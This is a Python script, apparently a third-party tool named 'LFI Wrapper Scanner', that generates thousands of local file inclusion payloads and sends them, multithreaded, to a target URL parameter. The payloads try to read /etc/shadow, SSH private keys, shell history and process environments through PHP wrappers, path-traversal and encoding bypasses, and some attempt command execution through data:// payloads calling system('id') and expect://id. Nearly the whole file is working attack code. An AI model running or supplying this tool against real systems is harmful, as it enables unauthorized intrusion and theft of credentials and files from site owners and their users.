#!/usr/bin/env python3

import requests
import argparse
import urllib.parse
import base64
import itertools
import time
import signal
import threading
import itertools as it
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Generator, Optional, Dict, Tuple
from dataclasses import dataclass
import warnings
from urllib.parse import urlparse, parse_qs
import re

class Banner:
    @staticmethod
    def show():
        print(
        """
\033[96m
                           _          _____      
 __      ___ __ __ _ _ __ | |__  _ __|___ / _ __ 
 \\ \\ /\\ / / '__/ _` | '_ \\| '_ \\| '_ \\ |_ \\| '__|
  \\ V  V /| | | (_| | |_) | | | | |_) |__) | |   
   \\_/\\_/ |_|  \\__,_| .__/|_| |_| .__/____/|_|   
                    |_|         |_|              
\033[0m
        \033[93mLFI Wrapper Scanner v2.0\033[0m
        \033[94mAdvanced PHP Wrapper-based LFI Detection Tool\033[0m
        \033[95mAuthor: csshark (Enhanced Edition)\033[0m
        """
        )


class HTTPClient:
    def __init__(
        self,
        proxy: Optional[str] = None,
        follow_redirects: bool = False,
        verify_ssl: bool = True,
        cookies: Optional[Dict] = None,
        headers: Optional[Dict] = None,
        timeout: int = 10
    ):
        self.session = requests.Session()
        self.session.verify = verify_ssl
        self.follow_redirects = follow_redirects
        self.timeout = timeout
        
        if proxy:
            self.session.proxies = {
                "http": proxy,
                "https": proxy
            }
        
        default_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        
        if headers:
            default_headers.update(headers)
            
        self.session.headers.update(default_headers)
        
        if cookies:
            self.session.cookies.update(cookies)
    
    def get(self, url: str, timeout: Optional[int] = None) -> Optional[requests.Response]:
        try:
            return self.session.get(
                url,
                timeout=timeout or self.timeout,
                allow_redirects=self.follow_redirects
            )
        except requests.RequestException:
            return None
    
    def post(self, url: str, data: Dict, timeout: Optional[int] = None) -> Optional[requests.Response]:
        try:
            return self.session.post(
                url,
                data=data,
                timeout=timeout or self.timeout,
                allow_redirects=self.follow_redirects
            )
        except requests.RequestException:
            return None


class PayloadGenerator:
    BASE_WRAPPERS = [
        "php://filter",
        "data://",
        "zip://",
        "phar://",
        "compress.zlib://",
        "compress.bzip2://",
        "file://",
        "expect://",
        "ogg://",
        "php://input",
        "php://fd/",
    ]
    
    FILTER_CHAINS = [
        "convert.base64-encode",
        "convert.base64-decode",
        "string.rot13",
        "string.toupper",
        "string.tolower",
        "string.strip_tags",
        "convert.iconv.utf-8.utf-16",
        "convert.iconv.utf-16.utf-8",
        "convert.iconv.utf-8.utf-16le",
        "convert.iconv.utf-16le.utf-8",
        "convert.iconv.utf-8.utf-16be",
        "convert.iconv.utf-16be.utf-8",
        "convert.quoted-printable-encode",
        "convert.quoted-printable-decode",
        "zlib.deflate",
        "zlib.inflate",
        "bzip2.compress",
        "bzip2.decompress",
    ]
    
    TRAVERSALS = [
        "../",
        "..\\",
        "..//",
        "....//",
        "....///",
        "..;/",
        "..%2f",
        "..%5c",
        "%2e%2e/",
        "%2e%2e%2f",
        "..%252f",
        "..%c0%af",
        "..%c1%9c",
        "%252e%252e%252f",
        "..%00/",
        "..\x00/",
        "....\\/",
        "..%5c..%5c",
    ]
    
    FILE_TARGETS = [
        "/etc/passwd",
        "/etc/hosts",
        "/etc/hostname",
        "/etc/issue",
        "/etc/shadow",
        "/etc/group",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/status",
        "/proc/self/fd/0",
        "/proc/self/fd/1",
        "/proc/self/fd/2",
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/var/log/httpd/access_log",
        "/var/log/httpd/error_log",
        "/var/log/syslog",
        "/var/log/messages",
        "/var/log/auth.log",
        "/var/log/vsftpd.log",
        "/var/log/proftpd.log",
        "/var/log/pureftpd.log",
        "/var/log/mail.log",
        "/var/log/maillog",
        "/home/$USER/.bash_history",
        "/home/$USER/.ssh/id_rsa",
        "/root/.ssh/id_rsa",
        "/var/www/html/index.php",
        "/var/www/index.php",
        "C:/Windows/win.ini",
        "C:/Windows/system.ini",
        "C:/Windows/System32/drivers/etc/hosts",
        "C:/xampp/apache/logs/access.log",
        "C:/xampp/apache/logs/error.log",
        "C:/wamp/logs/access.log",
        "C:/wamp/logs/error.log",
        "C:/Program Files/Apache Group/Apache2/logs/access.log",
    ]
    
    NULL_BYTE_VARIANTS = [
        "",
        "%00",
        "\x00",
        ";",
        "?",
        "#",
        "%%00",
        "%2500",
    ]
    
    ENCODING_TECHNIQUES = [
        "",
        "urlencode",
        "urlencode_full",
        "utf8",
        "unicode",
    ]
    
    @staticmethod
    def apply_encoding(payload: str, encoding: str) -> str:
        if encoding == "urlencode":
            return urllib.parse.quote(payload)
        elif encoding == "urlencode_full":
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding == "utf8":
            return payload.encode('utf-8').hex()
        elif encoding == "unicode":
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        else:
            return payload
    
    @staticmethod
    def generate_null_byte_payloads(base_payload: str) -> List[str]:
        null_payloads = []
        
        for null_variant in PayloadGenerator.NULL_BYTE_VARIANTS:
            null_payloads.append(f"{base_payload}{null_variant}")
            
            if "/" in base_payload:
                parts = base_payload.rsplit("/", 1)
                if len(parts) == 2:
                    null_payloads.append(f"{parts[0]}/{null_variant}{parts[1]}")
        
        return null_payloads
    
    @staticmethod
    def generate_truncation_payloads(base_path: str) -> List[str]:
        truncation_payloads = []
        
        path_parts = base_path.split("/")
        for i in range(len(path_parts)):
            truncated = "/".join(path_parts[:i+1]) + "/." 
            truncation_payloads.append(truncated.ljust(4096, "."))
            truncation_payloads.append(truncated.ljust(4096, "/"))
        
        return truncation_payloads
    
    @staticmethod
    def generate_double_encoding_payloads(base_payload: str) -> List[str]:
        double_encoded = []
        
        encoded_once = urllib.parse.quote(base_payload)
        encoded_twice = urllib.parse.quote(encoded_once)
        encoded_thrice = urllib.parse.quote(encoded_twice)
        
        double_encoded.extend([
            encoded_once,
            encoded_twice,
            encoded_thrice,
            base_payload.replace("/", "%252f"),
            base_payload.replace("/", "%25252f"),
            base_payload.replace(".", "%252e"),
            base_payload.replace(".", "%25252e"),
        ])
        
        return double_encoded
    
    @staticmethod
    def generate_wrapper_chains(base_path: str) -> List[str]:
        chains = []
        
        chains.append(f"php://filter/convert.base64-decode/convert.base64-encode/resource={base_path}")
        chains.append(f"php://filter/read=convert.base64-encode|convert.base64-encode/resource={base_path}")
        chains.append(f"php://filter/zlib.deflate/convert.base64-encode/resource={base_path}")
        chains.append(f"php://filter/convert.base64-encode|convert.iconv.utf-8.utf-16|convert.base64-decode/resource={base_path}")
        
        return chains
    
    @staticmethod
    def generate() -> Generator[str, None, None]:
        filter_chains = PayloadGenerator.generate_filter_chains()
        
        for wrapper in PayloadGenerator.BASE_WRAPPERS:
            for traversal in PayloadGenerator.TRAVERSALS:
                for file_target in PayloadGenerator.FILE_TARGETS:
                    base_path = f"{traversal}{file_target}"
                    
                    for encoding in PayloadGenerator.ENCODING_TECHNIQUES:
                        encoded_path = PayloadGenerator.apply_encoding(base_path, encoding)
                        
                        if wrapper == "php://filter":
                            for chain in filter_chains:
                                yield f"{wrapper}/{chain}/resource={encoded_path}"
                        elif wrapper == "data://":
                            php_code = base64.b64encode(b"<?php system('id'); ?>").decode()
                            yield f"data://text/plain;base64,{php_code}"
                            yield f"data://text/plain,<?php phpinfo();?>"
                        elif wrapper == "expect://":
                            yield f"expect://id"
                            yield f"expect://whoami"
                        elif wrapper == "php://input":
                            yield f"php://input"
                        else:
                            yield f"{wrapper}//{encoded_path}"
        
        for traversal in PayloadGenerator.TRAVERSALS:
            for file_target in PayloadGenerator.FILE_TARGETS:
                base_path = f"{traversal}{file_target}"
                for null_payload in PayloadGenerator.generate_null_byte_payloads(base_path):
                    yield f"php://filter/convert.base64-encode/resource={null_payload}"
        
        for traversal in PayloadGenerator.TRAVERSALS[:5]:
            for file_target in PayloadGenerator.FILE_TARGETS[:10]:
                base_path = f"{traversal}{file_target}"
                for trunc_payload in PayloadGenerator.generate_truncation_payloads(base_path):
                    yield trunc_payload
        
        base_payloads = list(PayloadGenerator.generate_base_payloads())
        for payload in random.sample(base_payloads, min(100, len(base_payloads))):
            for double_encoded in PayloadGenerator.generate_double_encoding_payloads(payload):
                yield double_encoded
        
        for traversal in PayloadGenerator.TRAVERSALS[:5]:
            for file_target in PayloadGenerator.FILE_TARGETS[:10]:
                base_path = f"{traversal}{file_target}"
                for chain_payload in PayloadGenerator.generate_wrapper_chains(base_path):
                    yield chain_payload
    
    @staticmethod
    def generate_filter_chains() -> List[str]:
        chains = []
        for r in range(1, 4):
            for combo in itertools.permutations(PayloadGenerator.FILTER_CHAINS, r):
                chains.append("|".join(combo))
        return chains
    
    @staticmethod
    def generate_base_payloads() -> Generator[str, None, None]:
        for wrapper in ["php://filter", "file://", "data://"]:
            for traversal in ["../", "..%2f", "%2e%2e/"]:
                for file_target in ["/etc/passwd", "/etc/hosts"]:
                    base_path = f"{traversal}{file_target}"
                    if wrapper == "php://filter":
                        yield f"{wrapper}/convert.base64-encode/resource={base_path}"
                    else:
                        yield f"{wrapper}/{base_path}"


class ResponseAnalyzer:
    INDICATORS = {
        "root:x:0:0": {"type": "LFI", "confidence": 0.9},
        "root:*:0:0": {"type": "LFI", "confidence": 0.9},
        "daemon:x:1:1": {"type": "LFI", "confidence": 0.8},
        "bin:x:2:2": {"type": "LFI", "confidence": 0.8},
        "nobody:x:65534": {"type": "LFI", "confidence": 0.7},
        "[fonts]": {"type": "LFI", "confidence": 0.8},
        "[extensions]": {"type": "LFI", "confidence": 0.8},
        "[mci extensions]": {"type": "LFI", "confidence": 0.8},
        "[files]": {"type": "LFI", "confidence": 0.7},
        "SERVER_SOFTWARE": {"type": "LFI", "confidence": 0.6},
        "DOCUMENT_ROOT": {"type": "LFI", "confidence": 0.6},
        "PATH=": {"type": "LFI", "confidence": 0.5},
        "HTTP_USER_AGENT": {"type": "LFI", "confidence": 0.5},
        "uid=": {"type": "RCE", "confidence": 0.9},
        "gid=": {"type": "RCE", "confidence": 0.9},
        "VULN": {"type": "RCE", "confidence": 0.7},
        "phpinfo()": {"type": "RCE", "confidence": 0.8},
        "PHP Version": {"type": "RCE", "confidence": 0.8},
        "failed to open stream": {"type": "ERROR", "confidence": 0.3},
        "No such file or directory": {"type": "ERROR", "confidence": 0.3},
        "include(": {"type": "ERROR", "confidence": 0.4},
        "Warning:": {"type": "ERROR", "confidence": 0.2},
        "Fatal error:": {"type": "ERROR", "confidence": 0.2},
    }
    
    ERROR_PATTERNS = [
        r"Warning:\s+include\(([^)]+)\)",
        r"Warning:\s+require\(([^)]+)\)",
        r"Warning:\s+include_once\(([^)]+)\)",
        r"Warning:\s+require_once\(([^)]+)\)",
        r"failed to open stream:\s+(.+?)\s+in",
        r"No such file or directory in (.+?) on line",
    ]
    
    @staticmethod
    def extract_path_from_error(content: str) -> Optional[str]:
        for pattern in ResponseAnalyzer.ERROR_PATTERNS:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                return match.group(1)
        return None
    
    @staticmethod
    def analyze_base64_content(content: str) -> Tuple[Optional[str], Optional[str]]:
        try:
            for chunk in [content, content[:1000], content[-1000:]]:
                try:
                    cleaned = ''.join(chunk.split())
                    if len(cleaned) % 4 == 0 and len(cleaned) > 20:
                        decoded = base64.b64decode(cleaned).decode('utf-8', errors='ignore')
                        for pattern, info in ResponseAnalyzer.INDICATORS.items():
                            if pattern in decoded:
                                return f"{info['type']}(base64)", decoded
                except:
                    continue
        except:
            pass
        return None, None
    
    @staticmethod
    def analyze_php_errors(content: str) -> Dict:
        errors = {}
        
        path = ResponseAnalyzer.extract_path_from_error(content)
        if path:
            errors['exposed_path'] = path
            errors['error_type'] = 'path_disclosure'
        
        abs_paths = re.findall(r'/(?:[a-zA-Z0-9._-]+/)*[a-zA-Z0-9._-]+\.php', content)
        if abs_paths:
            errors['absolute_paths'] = abs_paths
        
        config_files = re.findall(r'(?:config|database|db|wp-config)\.(?:php|ini|xml|json)', content, re.IGNORECASE)
        if config_files:
            errors['config_files'] = config_files
        
        return errors
    
    @staticmethod
    def analyze(content: str, response_headers: Dict = None) -> Dict:
        result = {
            'vulnerability_type': None,
            'confidence': 0.0,
            'details': {},
            'indicators_found': []
        }
        
        if not content:
            return result
        
        for pattern, info in ResponseAnalyzer.INDICATORS.items():
            if pattern in content:
                result['indicators_found'].append({
                    'pattern': pattern,
                    'type': info['type'],
                    'confidence': info['confidence']
                })
                
                if info['confidence'] > result['confidence']:
                    result['vulnerability_type'] = info['type']
                    result['confidence'] = info['confidence']
        
        vuln_type, decoded = ResponseAnalyzer.analyze_base64_content(content)
        if vuln_type:
            result['vulnerability_type'] = vuln_type
            result['confidence'] = max(result['confidence'], 0.75)
            result['details']['base64_decoded'] = decoded[:500]
        
        php_errors = ResponseAnalyzer.analyze_php_errors(content)
        if php_errors:
            result['details']['php_errors'] = php_errors
            
            if 'exposed_path' in php_errors:
                result['confidence'] = max(result['confidence'], 0.85)
                if not result['vulnerability_type']:
                    result['vulnerability_type'] = 'PATH_DISCLOSURE'
        
        if response_headers:
            result['details']['interesting_headers'] = {}
            interesting_headers = ['Server', 'X-Powered-By', 'Set-Cookie']
            for header in interesting_headers:
                if header in response_headers:
                    result['details']['interesting_headers'][header] = response_headers[header]
        
        return result


@dataclass
class Finding:
    payload: str
    vuln_type: str
    confidence: float
    details: Dict = None
    
    def __post_init__(self):
        if self.details is None:
            self.details = {}


class ProgressAnimator(threading.Thread):
    def __init__(self, scanner):
        super().__init__(daemon=True)
        self.scanner = scanner
        self.running = True
    
    def run(self):
        spinner = it.cycle(["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"])
        
        while self.running:
            with self.scanner.lock:
                print(
                    f"\r\033[K[{next(spinner)}] "
                    f"Tested: {self.scanner.tested} | "
                    f"Findings: {len(self.scanner.findings)} | "
                    f"Active: {threading.active_count()-2} | "
                    f"Speed: {self.scanner.get_speed():.1f}/s",
                    end="",
                    flush=True
                )
            time.sleep(0.1)


class LFIScanner:
    def __init__(
        self,
        client: HTTPClient,
        delay: float = 0.1,
        threads: int = 10,
        method: str = "GET",
        post_data: Dict = None
    ):
        self.client = client
        self.delay = delay
        self.threads = threads
        self.method = method.upper()
        self.post_data = post_data or {}
        self.stop = False
        self.findings: List[Finding] = []
        self.tested = 0
        self.start_time = time.time()
        self.lock = threading.Lock()
        
        signal.signal(signal.SIGINT, self._handle_stop)
    
    def _handle_stop(self, *_):
        print("\n\033[93m[!] Stopping scan...\033[0m")
        self.stop = True
    
    def get_speed(self) -> float:
        elapsed = time.time() - self.start_time
        return self.tested / elapsed if elapsed > 0 else 0
    
    def scan_payload(self, url: str, param: str, payload: str):
        if self.stop:
            return
        
        try:
            if self.method == "GET":
                full_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                response = self.client.get(full_url)
            else:
                post_data = self.post_data.copy()
                post_data[param] = payload
                response = self.client.post(url, post_data)
            
            with self.lock:
                self.tested += 1
            
            if not response:
                return
            
            analysis = ResponseAnalyzer.analyze(
                response.text,
                dict(response.headers)
            )
            
            if analysis['vulnerability_type'] and analysis['confidence'] > 0.6:
                with self.lock:
                    finding = Finding(
                        payload=payload,
                        vuln_type=analysis['vulnerability_type'],
                        confidence=analysis['confidence'],
                        details=analysis['details']
                    )
                    self.findings.append(finding)
                    
                    color = "\033[92m" if analysis['confidence'] > 0.8 else "\033[93m"
                    print(f"\n{color}[+] {finding.vuln_type} "
                          f"(confidence: {finding.confidence:.2f})\033[0m")
                    print(f"    Payload: {payload}")
                    
                    if analysis['details']:
                        if 'php_errors' in analysis['details']:
                            print(f"    Errors: {analysis['details']['php_errors']}")
        
        except Exception as e:
            pass
        
        time.sleep(self.delay)
    
    def scan(self, url: str, param: str):
        print(f"\033[96m[*] Starting scan against: {url}\033[0m")
        print(f"\033[96m[*] Parameter: {param}\033[0m")
        print(f"\033[96m[*] Threads: {self.threads}\033[0m")
        print(f"\033[96m[*] Method: {self.method}\033[0m")
        print()
        
        payloads = list(PayloadGenerator.generate())
        print(f"\033[96m[*] Generated {len(payloads)} test payloads\033[0m")
        print()
        
        animator = ProgressAnimator(self)
        animator.start()
        
        try:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = []
                
                for payload in payloads:
                    if self.stop:
                        break
                    
                    futures.append(
                        executor.submit(
                            self.scan_payload,
                            url,
                            param,
                            payload
                        )
                    )
                
                for future in as_completed(futures):
                    if self.stop:
                        break
        finally:
            animator.running = False
            print()
            self.summary()
    
    def summary(self):
        print("\n\033[95m" + "="*60 + "\033[0m")
        print("\033[95m=== SCAN SUMMARY ===\033[0m")
        print("\033[95m" + "="*60 + "\033[0m")
        
        elapsed = time.time() - self.start_time
        print(f"\033[96m[*] Duration: {elapsed:.2f}s\033[0m")
        print(f"\033[96m[*] Total tested: {self.tested}\033[0m")
        print(f"\033[96m[*] Average speed: {self.get_speed():.1f} requests/s\033[0m")
        print(f"\033[96m[*] Findings: {len(self.findings)}\033[0m")
        
        if self.findings:
            print(f"\n\033[93m=== VULNERABILITIES FOUND ===\033[0m")
            for i, finding in enumerate(self.findings, 1):
                print(f"\n\033[92m[{i}] {finding.vuln_type}\033[0m")
                print(f"    Confidence: {finding.confidence:.2f}")
                print(f"    Payload: {finding.payload}")
                
                if finding.details:
                    if 'base64_decoded' in finding.details:
                        print(f"    Decoded: {finding.details['base64_decoded'][:200]}")
                    if 'php_errors' in finding.details:
                        errors = finding.details['php_errors']
                        if 'exposed_path' in errors:
                            print(f"    Exposed Path: {errors['exposed_path']}")
                        if 'absolute_paths' in errors:
                            print(f"    Paths: {errors['absolute_paths'][:3]}")
        else:
            print("\n\033[91m[-] No vulnerabilities found\033[0m")


def main():
    warnings.filterwarnings("ignore")
    
    parser = argparse.ArgumentParser(
        description="Advanced PHP Wrapper-based LFI Scanner v2.0"
    )
    
    parser.add_argument("url", help="Target URL")
    parser.add_argument("param", help="Vulnerable parameter name")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--delay", type=float, default=0.05, help="Delay between requests")
    parser.add_argument("--threads", type=int, default=15, help="Number of threads")
    parser.add_argument("--method", choices=["GET", "POST"], default="GET", help="HTTP method")
    parser.add_argument("--data", help="POST data (e.g., 'user=admin&pass=test')")
    parser.add_argument("--cookie", help="Cookies (e.g., 'PHPSESSID=abc123')")
    parser.add_argument("--header", action="append", help="Custom headers (e.g., 'X-Token: 123')")
    parser.add_argument("--follow-redirects", action="store_true", help="Follow redirects")
    parser.add_argument("--insecure", action="store_true", help="Disable SSL verification")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout")
    
    args = parser.parse_args()
    
    Banner.show()
    
    cookies = {}
    if args.cookie:
        for cookie in args.cookie.split(';'):
            if '=' in cookie:
                key, value = cookie.strip().split('=', 1)
                cookies[key] = value
    
    headers = {}
    if args.header:
        for header in args.header:
            if ':' in header:
                key, value = header.split(':', 1)
                headers[key.strip()] = value.strip()
    
    post_data = {}
    if args.data:
        for pair in args.data.split('&'):
            if '=' in pair:
                key, value = pair.split('=', 1)
                post_data[key] = value
    
    client = HTTPClient(
        proxy=args.proxy,
        follow_redirects=args.follow_redirects,
        verify_ssl=not args.insecure,
        cookies=cookies,
        headers=headers,
        timeout=args.timeout
    )
    
    scanner = LFIScanner(
        client,
        delay=args.delay,
        threads=args.threads,
        method=args.method,
        post_data=post_data
    )
    
    scanner.scan(args.url, args.param)


if __name__ == "__main__":
    main()
